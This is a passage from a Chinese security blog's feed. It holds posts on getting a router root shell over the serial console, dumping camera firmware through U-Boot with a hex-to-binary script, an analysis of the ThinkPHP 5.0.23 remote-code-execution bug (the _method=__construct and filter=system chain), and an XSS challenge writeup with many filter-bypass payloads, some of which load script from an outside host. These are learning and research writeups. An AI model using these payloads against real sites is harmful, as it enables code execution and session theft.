class="line"></span><br><span class="line">Wireless Broadband Router&gt; help</span><br><span class="line">Error: help should be called with at least 1 argument</span><br><span class="line">help   Show help for commands within this menu</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">        help all - show all available commands in the current level</span><br><span class="line">        help [category]... category - show commands in a certain category</span><br><span class="line">        help [category]... command - show detailed help for a specific command</span><br><span class="line">        help -s string - search for categories/commands containing the string</span><br><span class="line"></span><br><span class="line">Availble help Categories</span><br><span class="line">help upnp - show help about UPnP commands</span><br><span class="line">help conf - show help about Read and write Wireless Broadband Router configuration data</span><br><span class="line">help option_manager - show help about Option Manager</span><br><span class="line">help fireball - show help about Fireball configuration and control</span><br><span class="line">help cwmp - show help about CWMP related commands</span><br><span class="line">help bridge - show help about API for managing ethernet bridge</span><br><span class="line">help firewall - show help about Control and display Firewall and NAT data</span><br><span class="line">help connection - show help about API for managing connections</span><br><span class="line">help inet_connection - show help about API for managing internet connections</span><br><span class="line">help misc - show help about API for Wireless Broadband Router miscellaneous tasks</span><br><span class="line">help firmware_update - show help about Firmware update commands</span><br><span class="line">help log - show help about Contorols Wireless Broadband Router logging behaviour</span><br><span class="line">help dev - show help about Device related commands</span><br><span class="line">help kernel - show help about Kernel related commands</span><br><span class="line">help system - show help about Commands to control Wireless Broadband Router execution</span><br><span class="line">help flash - show help about Flash and loader related commands</span><br><span class="line">help net - show help about Network related commands</span><br><span class="line">help cmd - show help about Commands related to the Command module</span><br><span class="line"></span><br><span class="line">Returned -1</span><br><span class="line">Wireless Broadband Router&gt; help system</span><br><span class="line"></span><br><span class="line">Command Category system - Commands to control Wireless Broadband Router execution</span><br><span class="line">die               Exit from Wireless Broadband Router and return ret</span><br><span class="line">ps                Print Wireless Broadband Router&apos;s tasks</span><br><span class="line">entity_close      Close an entity</span><br><span class="line">etask_list_dump   Dump back trace of all etasks</span><br><span class="line">restore_default   Restore default configuration</span><br><span class="line">reboot            Reboot the system</span><br><span class="line">ver               Display version information</span><br><span class="line">print_config      Print compilation configuration. Search for option if specified</span><br><span class="line">exec              Execute program</span><br><span class="line">cat               Print file contents to console</span><br><span class="line">shell             Spawn busybox shell in foreground</span><br><span class="line">date              Print the current UTC and local time</span><br><span class="line">exit              Exit sub menu</span><br><span class="line">help              Show help for commands within this menu</span><br><span class="line"></span><br><span class="line">Returned 0</span><br><span class="line">Wireless Broadband Router&gt;</span><br></pre></td></tr></table></figure><p>一些串口要求登录，另外有一些不要求。在这个案例中，登录只是设备的管理员用户名和密码，它将我们带入一个自定义命令行shell，我们可以用它来管理路由器。根据help的输出，system shell命令应该提供一个root权限的shell，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Wireless Broadband Router&gt; system shell</span><br><span class="line"></span><br><span class="line">BusyBox v1.01 (2005.09.07-07:38+0000) Built-in shell (lash)</span><br><span class="line">Enter &apos;help&apos; for a list of built-in commands.</span><br><span class="line"></span><br><span class="line">/ # cat /proc/cpuinfo</span><br><span class="line">system type             : TWINPASS-E</span><br><span class="line">processor               : 0</span><br><span class="line">cpu model               : unknown V4.1</span><br><span class="line">BogoMIPS                : 222.00</span><br><span class="line">wait instruction        : no</span><br><span class="line">microsecond timers      : yes</span><br><span class="line">tlb_entries             : 16</span><br><span class="line">extra interrupt vector  : yes</span><br><span class="line">hardware watchpoint     : yes</span><br><span class="line">VCED exceptions         : not available</span><br><span class="line">VCEI exceptions         : not available</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>这就是使用一个万用表和一些免费软件从逻辑上识别了串口的物理接口，发现了它的波特率并获得一个shell，我们可以用它来进一步探索系统。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是一篇来自devttys0的一篇文章，在寻找串口的方法上给出了很多有用的方法，是一篇不错的总结文，在国内没有看到翻译，所以就想翻译成中文供大家学习，第一次做翻译，如有错误之处，请大家体谅，可以给我留言，我会快速修改。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="IOT" scheme="https://hurricane618.me/tags/IOT/"/>
    
      <category term="翻译" scheme="https://hurricane618.me/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>萤石某摄像头的安全分析--固件提取</title>
    <link href="https://hurricane618.me/2019/02/18/yingshi-camera-firmware-extract/"/>
    <id>https://hurricane618.me/2019/02/18/yingshi-camera-firmware-extract/</id>
    <published>2019-02-18T15:35:08.000Z</published>
    <updated>2019-03-02T11:34:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>由于之前考研一直没有时间搞，现在终于有空来做一些小实验。</p><h2 id="固件提取方式"><a href="#固件提取方式" class="headerlink" title="固件提取方式"></a>固件提取方式</h2><p>比较主流的提取方式有以下几种：</p><ol><li>官网或者找客服索要固件</li><li>在线升级的时候抓包得到下载地址</li><li>拆flash芯片，用编程器读取芯片内容（也可以使用烧录夹直接获取flash，但是有些时候有保护引脚就只能拆芯片）</li><li>用硬件电路的调试接口和固件的bootloader获取固件</li><li>从串口进入系统之后，打包固件</li></ol><p>首先，这个摄像头现在没有升级操作，官网也没有固件。烧录夹现在还用的不熟练，在分析之后决定用硬件调试接口来获取固件。</p><h2 id="TTL接口线序"><a href="#TTL接口线序" class="headerlink" title="TTL接口线序"></a>TTL接口线序</h2><p>这里推荐一篇仙果大佬写的省钱版测序 <a href="https://bbs.pediy.com/thread-246405.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246405.htm</a> ，通过万用表就能简单判断vcc和gnd，gnd可以使用蜂鸣档快速判断，vcc可以用直流电压测量，黑表笔接gnd，红表笔探测其他接口，如果是3.3v或者5v，那红表笔所在接口就是vcc，随后txd和rxd需要先连接测试，如果不行再交换引脚。</p><img src="/2019/02/18/yingshi-camera-firmware-extract/1.jpg"><p>其中电路板的txd和rxd要和usb-ttl转接器的rxd和txd相连，接地线对接地线，如上图所示。这里推荐使用全隔离型的usb-ttl，可以防烧电脑接口。</p><p>这里采用的是外部供电的方式进入设备的uboot系统，所以需要接上电源然后再将usb-ttl接入电脑的接口。</p><p>在焊接的时候要特别注意不要将焊点连接在一起了，这样会导致串口连接不正常，要么没有数据显示，要么会无法输入。</p><h2 id="导出固件"><a href="#导出固件" class="headerlink" title="导出固件"></a>导出固件</h2><p>这里使用secureCRT连接串口，进入摄像头系统。我是windows系统，通过设备管理器可以看到连接的com口，之后配置连接。</p><img src="/2019/02/18/yingshi-camera-firmware-extract/2.png"><p>115200是比较常用的波特率，其中要注意流控制是不选的，因为没有进入正常的系统，而是uboot，所以不需要这些流控制协议。</p><p>连接成功之后一直跳错误……没办法重置一下，在进入系统之前它会确认是否进入系统，这里要按<code>ctrl+u</code>中断自动进系统，这样我们就成功进入uboot系统。</p><img src="/2019/02/18/yingshi-camera-firmware-extract/3.png"><p>比较重要的几个命令，<code>bdinfo</code>，<code>printenv</code>，<code>sf</code>，<code>md</code></p><p>通过<code>bdinfo</code>，可以知道一些基础的硬件设定。</p><img src="/2019/02/18/yingshi-camera-firmware-extract/4.png"><p><code>printenv</code>获得环境变量的具体数值。</p><img src="/2019/02/18/yingshi-camera-firmware-extract/5.png"><p><code>sf probe 0</code>选择我们的flash芯片。</p><img src="/2019/02/18/yingshi-camera-firmware-extract/6.png"><p>知道flash芯片大小为8M，然后在系统一开始会显示flash的地址分配</p><img src="/2019/02/18/yingshi-camera-firmware-extract/7.png"><p>由于内存有很多没有使用的部分，提取思路就是把flash中的固件读在未使用的内存中，然后用<code>md</code>命令读取出来</p><p><code>sf read 0xa1000000 0 0x800000</code></p><p>将flash的固件读出来之后，验证一下，读取linux内核看看有没有相关的东西。</p><p><code>md 0xa1060000 0xa0</code></p><img src="/2019/02/18/yingshi-camera-firmware-extract/8.png"><p>验证成功，现在就要把整个固件全部导出来。<code>md 0xa1000000 0x800000</code>。将结果保存在会话日志中，这样就得到了固件的二进制的文本内容。再转换成二进制文件，即得到固件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">hex_file = open(<span class="string">'session.log'</span>, <span class="string">'r'</span>)</span><br><span class="line">bin_file = open(<span class="string">'hex2bin.bin'</span>, <span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    line = hex_file.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    strs = line.split(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> strs:</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string))</span><br></pre></td></tr></table></figure><img src="/2019/02/18/yingshi-camera-firmware-extract/9.png"><p>但是发现和之前得到的固件结构有矛盾，怎么会只有一个zImage。。。所以切换成小端写入二进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">hex_file = open(<span class="string">'session.log'</span>, <span class="string">'r'</span>)</span><br><span class="line">bin_file = open(<span class="string">'hex2bin.bin'</span>, <span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    line = hex_file.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    strs = line.split(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> strs:</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string[<span class="number">-2</span>:]))</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string[<span class="number">-4</span>:<span class="number">-2</span>]))</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string[<span class="number">-6</span>:<span class="number">-4</span>]))</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string[:<span class="number">-6</span>]))</span><br></pre></td></tr></table></figure><img src="/2019/02/18/yingshi-camera-firmware-extract/10.png"><p>果然是大小端的问题，切换成小端序就能用binwalk分析出正确的结构。这个我们在提取的时候一定要注意大小端顺序问题。</p><p>最后感谢马良，在操作过程中的指点和引导，焊接图也是出自马良，学到了很多知识感激不尽。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;由于之前考研一直没有时间搞，现在终于有空来做一些小实验。&lt;/p&gt;
&lt;h2 id=&quot;固件提取方式&quot;&gt;&lt;a href=&quot;#固件提取方式&quot; class=&quot;headerlink&quot; title=&quot;固件提取方式&quot;&gt;&lt;/a&gt;固件提取方式&lt;/h2&gt;&lt;p&gt;比较主流的提取方式有以下几种：&lt;/p
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="IOT" scheme="https://hurricane618.me/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp 5.0.23 rce分析和复现</title>
    <link href="https://hurricane618.me/2019/02/03/thinkphp-5-0-23-rce/"/>
    <id>https://hurricane618.me/2019/02/03/thinkphp-5-0-23-rce/</id>
    <published>2019-02-03T02:08:15.000Z</published>
    <updated>2019-02-03T02:16:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>入口是在app::run()，这里有创建http的请求实例，</p><img src="/2019/02/03/thinkphp-5-0-23-rce/1.png"><p>随后在后面会有路由检查，从这里跟进函数<code>routeCheck</code>。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/2.png"><p>在路由检查中会到路由类的check方法处，继续跟进。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/3.png"><p>在check中会有获取当前方法的method</p><img src="/2019/02/03/thinkphp-5-0-23-rce/4.png"><p>下面在method中会获取<code>var_method</code>这个伪变量，其实这个就是我们通过post传进的<code>_method</code>，这里进入判断之后会将我们post的值当做Request类的方法调用，这里我们的poc是传入的<code>__construct</code>，这样就会调用它的构造方法，并且参数是post数据。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/5.png"><p>继续跟进构造方法，这里的foreach会遍历所有变量，将存在的参数全部覆盖掉，在我们传入的参数中的filter，就把之前的覆盖了，并且在这里传入method为get的原因也是因为之前注册路由是get方法，所以这里要把请求的method覆盖成get，避免报错。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/6.png"><p>在这调用完成之后<code>routeCheck</code>将返回<code>method</code>赋值给<code>dispatch</code>。之后会继续在run函数里面执行exec函数。由于type为method执行相应的分支。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/7.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/8.png"><p>而这里的<code>param</code>方法能获取参数，并且和URL中的参数合并。这里得到的参数就是post数据中的<code>get[]=dir</code></p><img src="/2019/02/03/thinkphp-5-0-23-rce/9.png"><p>它的返回调用了<code>input</code>方法，跟进<code>input</code>。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/10.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/11.png"><p><code>input</code>最后将参数和<code>filter</code>一起传入<code>array_walk_recursive</code>中。其中参数中有我们传的<code>dir</code>，而<code>filter</code>通过<code>getFilter</code>有我们传的<code>system</code>。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/12.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/13.png"><p>在这之后调用的<code>array_walk_recursive</code>会用<code>filterValue</code>，来处理数据，在这之中用<code>call_user_func</code>。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/14.png"><p>这里<code>system</code>和<code>dir</code>分别是filter和value中的值，凑在一起就触发命令执行。</p><p>这里是第一个poc的分析，而第二个poc比较类似，同样是利用input函数，这里利用的点是在param的<code>$this-&gt;method(true)</code>中。</p><p>因为是true所以进入了<code>server(&#39;REQUEST_METHOD&#39;)</code>，最后同样到input中，并且data是server数组，filter同样是system。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/15.png"><p>造成的效果都是命令执行。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><img src="/2019/02/03/thinkphp-5-0-23-rce/16.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/17.png"><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在调试的过程中也算是学到了很多东西，比如vscode+xdebug的动态调试方案，特别的轻巧，功能点也很完善。关于在验证poc的时候其实出了一些小问题，那就是我的burp发送的post数据和header之前多了一个空行，也就是这个多的空行导致我的poc老是失败……这也是注意小的细节问题，只有在真正调试的时候才会被发现。</p><p>以后还是要多动手实践。接下来几天我会研究一点新的东西，拭目以待吧。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">https://paper.seebug.org/787/</a></p><p><a href="https://blog.csdn.net/qq_29647709/article/details/86307859" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/86307859</a></p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;入口是在app::run()，这里有创建http的请求实例，&lt;/p&gt;
&lt;img src=&quot;/2019/02/03/thinkphp-5-0-
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
      <category term="代码审计" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>haozi xss 挑战赛 writeup</title>
    <link href="https://hurricane618.me/2019/01/27/haozi-xss-challenges/"/>
    <id>https://hurricane618.me/2019/01/27/haozi-xss-challenges/</id>
    <published>2019-01-27T13:38:32.000Z</published>
    <updated>2019-01-27T13:40:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没什么说的，div标签+没过滤直接插 <code>&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入点在<code>&lt;textarea&gt;</code>这种标签中，需要闭合标签，在插入payload。<code>&lt;/textarea&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入点在input标签的value属性中，然而依旧没有过滤，只要逃逸双引号再插其他标签就好。<code>1&quot;&gt;&lt;svg/onload=alert(1)&gt;//</code></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>()</code>，直接换成反引号就可以了。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反引号也GG，只好编码了这里用js编码。<code>&lt;img src=1 onerror=&#39;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&#39;&gt;</code></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始一头雾水，搞了编码无法解析，有查注释网上又没有…… 看了其他人的writeup之后，结果果然是多样性的注释。</p><p>这里在html里面的注释中有两种除了一般的<code>&lt;!-- --&gt;</code> 还有对称的写法<code>&lt;!-- --!&gt;</code> ，所以这里没过滤对称写法，所以就用这种就可以逃逸过滤插标签。<code>--!&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好吧，尝试了很久，想到了这种出现在标签内部的输入点，有两种思路，一个是在标签内部的属性和事件来触发js；一个是闭合现在的标签去插入新的攻击向量。想了老久不知道怎么破……看了writeup得知是利用换行，这里就有一个小细节了，这里的正则是<code>on.*=</code>这意味着<code>on</code>和<code>=</code>是以一个整体去判断的，这种以整体形式去做判断的逻辑可以用一些拆分技巧了绕过。所以正确的payload为<code>onmousemove换行=alert(1)</code>。</p><p>这里试了很久都没找到非交互的操作，最后还是只有交互操作触发xss。</p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知识点：利用浏览器的自动补全特性绕过……又是一个老知识点就是没想到这个点，想到了要在<code>&lt;&gt;</code>上做文章，没想到自动补全。。。记个笔记当标签不完整的时候<code>&lt;img src=1 onerror=alert(1)</code> ，像这样浏览器会自动把末尾的<code>&gt;</code>用其他的标签补充上。实际自动补充如下图：</p><img src="/2019/01/27/haozi-xss-challenges/1.png"><p>而我们的输入拼接上实际上是这样的<code>&lt;article&gt;&lt;img src=1 onerror=alert(1) &lt;/article&gt;</code></p><p>可以看到原来的<code>&lt;/article&gt;</code>成了img标签中的一部分，随后浏览器又在后面补充了一个<code>&lt;/article&gt;</code>。</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点依旧是正则过滤的问题，这里的过滤规则写的太死，所以可以在中间加入空格或者换行来绕过。</p><p><code>&lt;/style &gt;&lt;img src=1 onerror=alert(1)&gt;</code>或者<code>&lt;/style换行&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然限制了必须要在<code>www.segmentfault.com</code>这个域下，但是也没过滤其他危险字符，那我们直接闭合前面的script然后在后面构造自己的恶意脚本就行。<code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://xss.haozi.me/j.js</code></p><p>上面是利用双引号字符去结合构造的payload，也可以直接注释掉。<code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;svg/onload=alert(1)&gt;//</code></p><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题是上道题目的加强版，把多余的特殊字符都转义成html实体了，这样就没有办法突破src这个字符串，突破口只能在src这里。观察发现没有过滤<code>@</code>和<code>#</code>想到应该是要用到url相关的trick。把orange的ppt翻出来复习，试了<code>@</code>和<code>#@</code>都不行。。。一脸懵逼</p><p>最后去看了其他人的writeup，答案是<code>https://www.segmentfault.com@xss.haozi.me/j.js</code></p><p>利用<code>@</code>的子资源请求功能去请求恶意的js，然而我是用chrome来做题的，之前半天没反应，在控制台看了看，发现chrome禁用了子资源请求。太尴尬了……</p><img 